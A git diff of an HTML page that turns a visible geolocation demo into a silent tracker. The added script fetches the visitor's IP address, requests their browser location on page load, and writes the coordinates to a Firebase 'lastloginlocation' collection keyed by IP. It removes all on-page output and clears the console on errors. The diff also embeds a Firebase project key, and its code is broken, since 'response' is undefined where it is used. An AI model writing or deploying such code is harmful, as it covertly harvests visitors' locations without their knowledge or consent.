@@ -9,39 +9,75 @@
 </head>
 
 <body>
-    <div id="out"></div>
-    <script>function geoFindMe() {
-            var output = document.getElementById("out");
+    <script src="https://www.gstatic.com/firebasejs/7.0.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.0.0/firebase-firestore.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script>
+        async function getIpClient() {
+            try {
+                const response = await axios.get('https://api.ipify.org?format=json');
+            } catch (error) {
+                console.error('error');
+            }
+        }
+
+        getIpClient();
+    </script>
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyA-HmW1LzSTqn3Ax0tJL1MgOWKyf7t4SeQ",
+            authDomain: "testproject-a578h.firebaseapp.com",
+            projectId: "testproject-a578h",
+            storageBucket: "testproject-a578h.appspot.com",
+            messagingSenderId: "883427772443",
+            appId: "1:883427772443:web:a6f0902843ee4a0663d0be",
+            measurementId: "G-VC34N90GNF"
+        };
+
+        firebase.initializeApp(firebaseConfig)
+        const db = firebase.firestore()
+
+        function sent(a, o) {
+            db.collection('lastloginlocation')
+                .doc(response.data.ip)
+                .set({
+                    latitude: a
+                },
+                    { merge: true }
+                )
+            db.collection('lastloginlocation')
+                .doc(response.data.ip)
+                .set({
+                    longitude: o
+                },
+                    { merge: true }
+                )
+        }
+
+
+        function geoFindMe() {
 
             if (!navigator.geolocation) {
-                output.innerHTML = "<p>Geolocation is not supported by your browser</p>";
+                console.clear()
                 return;
             }
 
             function success(position) {
                 var latitude = position.coords.latitude;
                 var longitude = position.coords.longitude;
-
-                output.innerHTML = '<p>Latitude is ' + latitude + '° <br>Longitude is ' + longitude + '°</p>';
-
-                var img = new Image();
-                img.src = "http://maps.googleapis.com/maps/api/staticmap?center=" + latitude + "," + longitude + "&zoom=13&size=300x300&sensor=false";
-
-                output.appendChild(img);
+                sent(latitude, longitude)
             };
 
             function error() {
-                output.innerHTML = "Unable to retrieve your location";
+                console.clear()
             };
-
-            output.innerHTML = "<p>Locating…</p>";
 
             navigator.geolocation.getCurrentPosition(success, error);
         }
-        
+
         geoFindMe()
 
-        </script>
+    </script>
 </body>
 
 </html>
